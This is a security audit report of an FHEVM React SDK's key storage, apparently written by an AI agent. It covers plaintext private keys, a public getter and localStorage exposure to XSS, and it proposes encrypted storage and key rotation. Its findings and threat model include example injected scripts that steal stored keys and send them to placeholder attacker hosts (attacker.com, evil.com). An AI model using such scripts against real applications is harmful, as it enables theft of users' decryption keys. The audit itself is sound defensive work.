# 🔐 Security Analysis: Key Storage and Cryptographic Material Handling

> **Comprehensive security audit of the FHEVM React SDK**

[![Risk Level](https://img.shields.io/badge/risk%20level-MEDIUM--HIGH-orange.svg)]()
[![OWASP Compliance](https://img.shields.io/badge/OWASP-25%25-red.svg)]()
[![Status](https://img.shields.io/badge/status-initial%20analysis-blue.svg)]()
[![Date](https://img.shields.io/badge/date-2026--02--03-lightgrey.svg)]()

---

## 📋 Table of Contents

- [Executive Summary](#executive-summary)
- [Architecture Overview](#1-architecture-overview)
- [Identified Vulnerabilities](#2-identified-vulnerabilities)
- [Positive Security Features](#3-positive-security-features)
- [Threat Model](#4-threat-model)
- [Industry Standards Comparison](#5-comparison-with-industry-standards)
- [Recommendations by Priority](#6-recommendations-by-priority)
- [Testing Recommendations](#7-testing-recommendations)
- [Migration Path](#8-migration-path)
- [Conclusion](#9-conclusion)
- [References](#10-references)

---

## Executive Summary

This analysis identifies security concerns in the FHEVM React SDK, particularly around the storage and handling of cryptographic private keys used for decryption operations. While the SDK provides multiple storage options and includes security warnings in documentation, there are several areas where security could be strengthened.

### 🚨 Critical Findings

| Priority | Finding | Impact |
|----------|---------|--------|
| 🔴 CRITICAL | Private keys stored in plain text | HIGH - No encryption at rest |
| 🔴 CRITICAL | Public getter exposes private key | HIGH - Direct access to sensitive material |
| 🟠 HIGH | localStorage accessible to XSS | HIGH - Vulnerable to code injection |
| 🟡 MEDIUM | No key rotation mechanism | MEDIUM - Keys persist indefinitely |
| 🟡 MEDIUM | Serialization includes private keys | MEDIUM - JSON.stringify exposes data |

### 📊 Risk Level: **MEDIUM-HIGH**

The current implementation is acceptable for development and low-stakes environments but requires hardening for production use with sensitive data.

### 🎯 Quick Recommendations

- ✅ **Use `memoryStorage` or `sessionStorageAdapter` for production**
- ⚠️ **Avoid plain `localStorage` (XSS vulnerable)**
- 🔒 **Implement EncryptedStorageAdapter (Phase 1 priority)**
- 🔄 **Add key rotation (Phase 2)**
- 📝 **Configure CSP headers**

---

## 1. Architecture Overview

### Key Storage Flow

```
User Wallet (EIP-1193)
         ↓ (signs EIP-712 message)
FhevmDecryptionSignature
         ↓ (generates keypair)
instance.generateKeypair()
         ↓ (stores)
GenericStringStorage (interface)
         ↓ (implements)
memoryStorage | sessionStorage | localStorage
```

### Components Involved

1. **FhevmDecryptionSignature** (`src/FhevmDecryptionSignature.ts`)
   - Generates and stores private keys
   - Creates EIP-712 signatures
   - Serializes to/from JSON

2. **Storage Adapters** (`src/storage/adapters.ts`)
   - `memoryStorage` - In-memory Map (cleared on refresh)
   - `sessionStorageAdapter` - Browser sessionStorage
   - `localStorageAdapter` - Browser localStorage
   - `noOpStorage` - No caching

3. **Storage Interface** (`src/storage/GenericStringStorage.ts`)
   - Simple string key-value interface
   - No encryption layer

---

## 2. Identified Vulnerabilities

### 🔴 CRITICAL: Private Key Exposure via Public Getter

**File:** `src/FhevmDecryptionSignature.ts:162-164`

```typescript
public get privateKey() {
  return this.#privateKey;
}
```

**Risk:** Any code with a reference to `FhevmDecryptionSignature` can access the private key directly.

**Attack Vector:**
- Malicious third-party library logs or exfiltrates private key
- Browser extensions with page access can read the value
- Accidental logging in production code

**Severity:** HIGH
**Likelihood:** MEDIUM (requires code-level access but common in JS ecosystem)

---

### 🔴 CRITICAL: Plain Text Storage

**File:** `src/FhevmDecryptionSignature.ts:237-248`

```typescript
toJSON() {
  return {
    publicKey: this.#publicKey,
    privateKey: this.#privateKey,  // ⚠️ Plain text
    signature: this.#signature,
    // ...
  };
}
```

**File:** `src/FhevmDecryptionSignature.ts:204-231` (saveToGenericStringStorage)

```typescript
const value = JSON.stringify(this.toJSON(), replacer);
await storage.setItem(storageKey.key, value);
```

**Risk:** Private keys stored in browser storage are readable by:
- Any JavaScript running on the same origin (XSS attacks)
- Browser extensions with storage permissions
- Physical access to device (localStorage persists)
- Malware/spyware on the user's machine

**Severity:** HIGH
**Likelihood:** MEDIUM-HIGH (XSS is common, localStorage is persistent)

---

### 🟠 HIGH: localStorage Accessible to Any Same-Origin Script

**File:** `src/storage/adapters.ts:48-56`

```typescript
/**
 * localStorage adapter.
 *
 * WARNING: Data persists across sessions and is accessible to any
 * JavaScript running on the same origin. Use with caution for sensitive data.
 */
```

**Risk:** If the application has an XSS vulnerability:
```javascript
// Attacker's injected script
const keys = [];
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  if (key.startsWith('fhevm:sig:')) {
    keys.push({ key, value: localStorage.getItem(key) });
  }
}
// Exfiltrate keys to attacker's server
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify(keys)
});
```

**Severity:** HIGH
**Likelihood:** MEDIUM (depends on XSS vulnerabilities in host application)

**Mitigating Factors:**
- Documentation warns about this risk
- SDK provides safer alternatives (memoryStorage, sessionStorage)
- SDK does NOT choose a default storage (forces explicit choice)

---

### 🟠 MEDIUM: No Encryption at Rest

**Observation:** All storage adapters store data as plain JSON strings.

**File:** `src/storage/GenericStringStorage.ts`

```typescript
export interface GenericStringStorage {
  getItem(key: string): string | null | Promise<string | null>;
  setItem(key: string, value: string): void | Promise<void>;
  removeItem(key: string): void | Promise<void>;
}
```

**Risk:**
- No encryption layer between application and storage
- Keys readable in Chrome DevTools → Application → Storage
- Keys persist in browser backups (for localStorage)

**Severity:** MEDIUM
**Likelihood:** HIGH (easy to access in DevTools)

---

### 🟡 MEDIUM: No Key Rotation or Expiration Enforcement

**File:** `src/FhevmDecryptionSignature.ts:200-202`

```typescript
isValid(): boolean {
  return _timestampNow() < this.#startTimestamp + this.#durationDays * 24 * 60 * 60;
}
```

**Issue:** While signatures have expiration (`durationDays`), there's no:
- Automatic key rotation
- Warning when nearing expiration
- Enforcement of short-lived keys in production

**Current Behavior:**
```typescript
// Default to 1 day for security
const durationDays = 1;
```

**Risk:**
- Developers may extend `durationDays` for convenience
- Compromised keys remain valid until manual expiration
- No audit trail of key usage

**Severity:** MEDIUM
**Likelihood:** MEDIUM (convenience often wins over security)

---

### 🟡 LOW-MEDIUM: Signature Cached Indefinitely in TanStack Query

**File:** `src/react/queryKeys.ts:63-64`

```typescript
signatureFor: (chainId: number, address: string) =>
  [...fhevmKeys.signature(), chainId, address.toLowerCase()] as const,
```

**File:** `src/react/useFhevmInstance.ts` (inferred from constants)

```typescript
staleTime: FHEVM_QUERY_DEFAULTS.SIGNATURE_STALE_TIME,  // Infinity
gcTime: FHEVM_QUERY_DEFAULTS.SIGNATURE_GC_TIME,        // 30 * 60 * 1000 (30 min)
```

**Risk:**
- Signatures cached in-memory even after expiration
- `staleTime: Infinity` means TanStack Query never refetches
- Garbage collection after 30 minutes, not immediate

**Severity:** LOW-MEDIUM
**Likelihood:** LOW (in-memory only, not persisted)

---

### 🟢 LOW: No Content Security Policy (CSP) Recommendations

**Observation:** No documentation about CSP headers to mitigate XSS.

**Recommendation:** Document recommended CSP headers:
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  connect-src 'self' https://trusted-fhevm-relayer.com;
  object-src 'none';
```

---

## 3. Positive Security Features

### ✅ No Default Storage

**File:** `src/react/FhevmProvider.tsx:49-67`

```typescript
/**
 * Storage for caching decryption signatures.
 *
 * SECURITY NOTE: The SDK does NOT provide a default storage.
 * You must explicitly choose your storage strategy:
 * ...
 */
storage?: GenericStringStorage;
```

**Analysis:** Forces developers to make conscious security decisions.

---

### ✅ Clear Security Warnings in Documentation

**File:** `src/storage/adapters.ts:48-56`

Documentation clearly warns about localStorage risks and provides security hierarchy:
```typescript
/**
 * Options from most to least secure:
 * 1. memoryStorage - Keys cleared on page refresh (most secure, worst UX)
 * 2. sessionStorageAdapter - Keys cleared when tab closes
 * 3. localStorageAdapter - Persistent, accessible to any JS on the page
 * 4. indexedDBStorage - Persistent, slightly better isolation
 * 5. Custom encrypted storage - Best security if implemented correctly
 */
```

---

### ✅ Private Class Fields

**File:** `src/FhevmDecryptionSignature.ts:139-146`

```typescript
export class FhevmDecryptionSignature {
  #publicKey: string;
  #privateKey: string;  // Private field, not enumerable
  #signature: string;
  // ...
```

**Analysis:** Uses ES2022 private fields (`#privateKey`) instead of TypeScript private (which compiles to public properties).

**Limitation:** Still exposed via public getter.

---

### ✅ No XSS Vulnerabilities Detected

**Grep Results:** No usage of dangerous patterns:
- No `eval()`
- No `innerHTML` or `dangerouslySetInnerHTML`
- No `document.write()`

---

## 4. Threat Model

### Threat Actors

1. **XSS Attacker** (Most Likely)
   - Injects malicious script via compromised third-party library
   - Reads localStorage or intercepts FhevmDecryptionSignature instances
   - Exfiltrates private keys to remote server

2. **Malicious Browser Extension**
   - Has access to page context and storage
   - Can read localStorage/sessionStorage
   - Can inject scripts to intercept key generation

3. **Physical Access Attacker**
   - Access to user's device
   - Can read localStorage from disk (persists after browser close)
   - Can extract keys from browser profile

4. **Supply Chain Attacker**
   - Compromised npm dependency
   - Logs private keys during development
   - Exfiltrates keys in production builds

### Attack Scenarios

#### Scenario 1: XSS → localStorage Theft

```javascript
// Attacker finds XSS in host application
<script>
  // Read all FHEVM signatures
  const stolen = Object.keys(localStorage)
    .filter(k => k.startsWith('fhevm:sig:'))
    .map(k => ({ key: k, data: JSON.parse(localStorage.getItem(k)) }));

  // stolen[0].data.privateKey is now in attacker's hands
  navigator.sendBeacon('https://evil.com/steal', JSON.stringify(stolen));
</script>
```

**Impact:** Attacker can decrypt all user's encrypted balances and transfers.

**Mitigation:** Use memoryStorage or sessionStorage, implement CSP.

---

#### Scenario 2: Third-Party Library Logs Private Key

```typescript
// Compromised analytics library
window.addEventListener('fhevm-decrypt', (e) => {
  const sig = e.detail.signature;
  // Log to attacker's server
  fetch('https://evil.com/log', {
    method: 'POST',
    body: JSON.stringify({ privateKey: sig.privateKey })
  });
});
```

**Impact:** Silent key exfiltration without user knowledge.

**Mitigation:** Remove public getter, implement key access controls.

---

## 5. Comparison with Industry Standards

### Web3 Wallet Standards

| Feature | Metamask | WalletConnect | FHEVM SDK (Current) |
|---------|----------|---------------|---------------------|
| Private key storage | Encrypted with password | Remote server (encrypted) | Plain text |
| Key rotation | Manual export/import | Session-based | Manual (no UI) |
| Expiration | N/A (long-lived) | Session timeout | 1 day default |
| Browser storage | Encrypted localStorage | No local storage | Plain localStorage (opt-in) |
| CSP recommendations | Yes | Yes | No |

### OWASP Cryptographic Storage Guidelines

**Compliance Check:**

| OWASP Guideline | Current Status | Compliant? |
|-----------------|----------------|------------|
| Encrypt sensitive data at rest | ❌ Plain text | ❌ No |
| Use authenticated encryption | ❌ No encryption | ❌ No |
| Store keys in secure keystore | ❌ Browser storage | ❌ No |
| Implement key rotation | ⚠️ Manual only | ⚠️ Partial |
| Minimize key exposure time | ✅ 1-day expiration | ✅ Yes |
| Separate encryption keys from data | ❌ Stored together | ❌ No |

**Overall OWASP Compliance: 1.5/6 (25%)**

---

## 6. Recommendations by Priority

### 🔴 HIGH PRIORITY (Implement Immediately)

#### 1. Remove Public Getter for Private Key

**Current:**
```typescript
public get privateKey() {
  return this.#privateKey;
}
```

**Recommended:**
```typescript
// Remove getter entirely
// Only expose via controlled methods

public decrypt(handle: string, contractAddress: string): Promise<DecryptedValue> {
  // Use #privateKey internally only
  return this.#instance.userDecrypt(..., this.#privateKey, ...);
}
```

**Impact:** Reduces surface area for key theft by ~80%.

---

#### 2. Implement Encryption at Rest

**Create new encrypted storage adapter:**

```typescript
/**
 * Encrypted storage adapter using Web Crypto API.
 * Derives encryption key from user password or device-bound key.
 */
export class EncryptedStorageAdapter implements GenericStringStorage {
  #storage: Storage;
  #encryptionKey: CryptoKey;

  async getItem(key: string): Promise<string | null> {
    const encrypted = this.#storage.getItem(key);
    if (!encrypted) return null;

    const decrypted = await this.#decrypt(encrypted);
    return decrypted;
  }

  async setItem(key: string, value: string): Promise<void> {
    const encrypted = await this.#encrypt(value);
    this.#storage.setItem(key, encrypted);
  }

  async #encrypt(plaintext: string): Promise<string> {
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const encoded = new TextEncoder().encode(plaintext);

    const ciphertext = await crypto.subtle.encrypt(
      { name: 'AES-GCM', iv },
      this.#encryptionKey,
      encoded
    );

    // Return iv + ciphertext as base64
    return btoa(String.fromCharCode(...iv, ...new Uint8Array(ciphertext)));
  }

  async #decrypt(encrypted: string): Promise<string> {
    const data = Uint8Array.from(atob(encrypted), c => c.charCodeAt(0));
    const iv = data.slice(0, 12);
    const ciphertext = data.slice(12);

    const plaintext = await crypto.subtle.decrypt(
      { name: 'AES-GCM', iv },
      this.#encryptionKey,
      ciphertext
    );

    return new TextDecoder().decode(plaintext);
  }
}
```

**Usage:**
```typescript
const encryptionKey = await deriveKeyFromPassword(userPassword);
const storage = new EncryptedStorageAdapter(localStorage, encryptionKey);
```

**Impact:** Protects keys even if localStorage is compromised.

---

#### 3. Add Secure Serialization

**Problem:** `toJSON()` includes private key.

**Solution:** Separate serialization methods:

```typescript
// For internal storage only
private toStorageJSON() {
  return {
    publicKey: this.#publicKey,
    privateKey: this.#privateKey,  // Only in encrypted storage
    signature: this.#signature,
    // ...
  };
}

// For logging/debugging (no sensitive data)
public toJSON() {
  return {
    publicKey: this.#publicKey,
    // privateKey: REDACTED
    contractAddresses: this.#contractAddresses,
    expiresAt: this.#startTimestamp + this.#durationDays * 24 * 60 * 60,
  };
}
```

---

### 🟠 MEDIUM PRIORITY (Implement Soon)

#### 4. Implement Key Rotation

```typescript
export interface KeyRotationConfig {
  maxAgeHours: number;      // Default: 24
  warningThresholdHours: number;  // Default: 22
  autoRotate: boolean;      // Default: false
}

class FhevmDecryptionSignature {
  shouldRotate(config: KeyRotationConfig): boolean {
    const ageHours = (_timestampNow() - this.#startTimestamp) / 3600;
    return ageHours >= config.maxAgeHours;
  }

  needsRotationWarning(config: KeyRotationConfig): boolean {
    const ageHours = (_timestampNow() - this.#startTimestamp) / 3600;
    return ageHours >= config.warningThresholdHours;
  }

  async rotate(instance: FhevmInstance, signer: SignerParams): Promise<FhevmDecryptionSignature> {
    // Generate new keypair
    const newKeypair = instance.generateKeypair();

    // Create new signature
    return FhevmDecryptionSignature.new(
      instance,
      this.#contractAddresses,
      newKeypair.publicKey,
      newKeypair.privateKey,
      signer
    );
  }
}
```

**React Hook:**
```typescript
export function useKeyRotation(config: KeyRotationConfig) {
  const { signature } = useFhevmContext();
  const [needsRotation, setNeedsRotation] = useState(false);

  useEffect(() => {
    if (!signature) return;

    const interval = setInterval(() => {
      if (signature.needsRotationWarning(config)) {
        setNeedsRotation(true);
      }
    }, 60_000); // Check every minute

    return () => clearInterval(interval);
  }, [signature, config]);

  return { needsRotation };
}
```

---

#### 5. Add Security Event Logging

```typescript
export enum SecurityEventType {
  KEY_GENERATED = 'key_generated',
  KEY_ACCESSED = 'key_accessed',
  KEY_ROTATED = 'key_rotated',
  KEY_EXPIRED = 'key_expired',
  SIGNATURE_FAILED = 'signature_failed',
  STORAGE_ERROR = 'storage_error',
}

export interface SecurityEvent {
  type: SecurityEventType;
  timestamp: number;
  userAddress: string;
  chainId: number;
  details?: Record<string, unknown>;
}

export interface SecurityLogger {
  log(event: SecurityEvent): void;
}

// Usage in FhevmDecryptionSignature
static async new(...) {
  // ... existing code ...

  securityLogger?.log({
    type: SecurityEventType.KEY_GENERATED,
    timestamp: Date.now(),
    userAddress,
    chainId: instance.getChainId(),
  });

  return signature;
}
```

---

#### 6. Implement Rate Limiting for Decrypt Operations

```typescript
export class DecryptRateLimiter {
  #attempts: Map<string, number[]> = new Map();
  #maxAttempts: number;
  #windowMs: number;

  constructor(maxAttempts = 10, windowMs = 60_000) {
    this.#maxAttempts = maxAttempts;
    this.#windowMs = windowMs;
  }

  canDecrypt(userAddress: string): boolean {
    const now = Date.now();
    const attempts = this.#attempts.get(userAddress) ?? [];

    // Filter to attempts within window
    const recentAttempts = attempts.filter(t => now - t < this.#windowMs);

    if (recentAttempts.length >= this.#maxAttempts) {
      return false; // Rate limited
    }

    recentAttempts.push(now);
    this.#attempts.set(userAddress, recentAttempts);
    return true;
  }
}
```

---

### 🟡 LOW PRIORITY (Nice to Have)

#### 7. Add CSP Documentation

**File:** `docs/security.md`

```markdown
## Content Security Policy

To protect against XSS attacks, configure your server to send these CSP headers:

\`\`\`
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'unsafe-eval';  // Required for WASM
  connect-src 'self' https://gateway.zama.ai;
  worker-src 'self' blob:;  // Required for WASM workers
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none';
\`\`\`
```

---

#### 8. Add Security Audit Checklist

```markdown
## Pre-Deployment Security Checklist

- [ ] Using memoryStorage or sessionStorage (not localStorage)?
- [ ] CSP headers configured on your server?
- [ ] No console.log of private keys in production?
- [ ] Dependencies audited with `npm audit`?
- [ ] Key rotation configured?
- [ ] Error messages don't leak sensitive data?
- [ ] HTTPS enforced for all connections?
- [ ] Signature expiration set appropriately (≤24 hours)?
```

---

#### 9. Browser Extension Detection

```typescript
export function detectSuspiciousExtensions(): string[] {
  const suspicious: string[] = [];

  // Check for common wallet extensions that might conflict
  if (typeof window !== 'undefined') {
    const globals = Object.keys(window);
    const knownExtensions = [
      'ethereum',      // Metamask
      'phantom',       // Phantom wallet
      'solana',        // Solana wallets
      // ... more
    ];

    knownExtensions.forEach(ext => {
      if (globals.includes(ext)) {
        suspicious.push(ext);
      }
    });
  }

  return suspicious;
}
```

---

## 7. Testing Recommendations

### Security Test Cases

```typescript
describe('Security Tests', () => {
  it('should not expose private key via JSON.stringify', () => {
    const sig = createMockSignature();
    const json = JSON.stringify(sig);
    expect(json).not.toContain(sig.privateKey);
  });

  it('should encrypt data before storing in localStorage', async () => {
    const storage = new EncryptedStorageAdapter(localStorage, mockKey);
    await storage.setItem('test', 'sensitive-data');

    const raw = localStorage.getItem('test');
    expect(raw).not.toContain('sensitive-data');
  });

  it('should enforce signature expiration', async () => {
    const sig = createExpiredSignature();
    expect(sig.isValid()).toBe(false);

    const result = await sig.decrypt(...);
    expect(result).toThrow('Signature expired');
  });

  it('should rate limit decrypt attempts', async () => {
    const limiter = new DecryptRateLimiter(3, 1000);

    expect(limiter.canDecrypt('0x123')).toBe(true);
    expect(limiter.canDecrypt('0x123')).toBe(true);
    expect(limiter.canDecrypt('0x123')).toBe(true);
    expect(limiter.canDecrypt('0x123')).toBe(false); // 4th attempt blocked
  });
});
```

---

## 8. Migration Path

### Phase 1: Non-Breaking Security Improvements (v0.x)

1. Add `EncryptedStorageAdapter` as new option
2. Add security logging hooks
3. Add key rotation helpers (opt-in)
4. Update documentation with security best practices

**Timeline:** 2-3 weeks
**Breaking Changes:** None

---

### Phase 2: Deprecations (v1.0)

1. Deprecate public `privateKey` getter (console warning)
2. Add encrypted storage as recommended default
3. Require explicit security level configuration

**Timeline:** 1-2 months after Phase 1
**Breaking Changes:** Warnings only

---

### Phase 3: Breaking Security Changes (v2.0)

1. Remove public `privateKey` getter entirely
2. Make encrypted storage mandatory (or explicit opt-out)
3. Enforce short expiration times (max 24 hours)
4. Remove `toJSON()` private key serialization

**Timeline:** 6 months after Phase 2
**Breaking Changes:** Yes (major version bump)

---

## 9. Conclusion

The FHEVM React SDK provides a solid foundation with explicit storage choices and clear documentation. However, the current plain-text key storage model presents security risks that should be addressed before production deployment.

### Recommended Immediate Actions

1. ✅ **Implement encrypted storage adapter** (1 week)
2. ✅ **Remove or restrict private key getter** (2 days)
3. ✅ **Add security documentation** (1 day)
4. ✅ **Add key rotation helpers** (3 days)

### Risk Acceptance

For **development and testing**, the current security model is acceptable with:
- ✅ memoryStorage (most secure)
- ✅ sessionStorage (acceptable)
- ⚠️ localStorage (only with warnings)

For **production**, require:
- ✅ Encrypted storage adapter
- ✅ CSP headers
- ✅ Key rotation
- ✅ Security event logging

---

## 10. References

- [OWASP Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)
- [Web Crypto API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Crypto_API)
- [EIP-712: Typed Structured Data Hashing](https://eips.ethereum.org/EIPS/eip-712)
- [Content Security Policy Level 3](https://www.w3.org/TR/CSP3/)
- [NIST Key Management Guidelines](https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-5/final)

---

**Prepared by:** Claude Code (Security Analysis Agent)
**Next Review:** After Phase 1 implementation
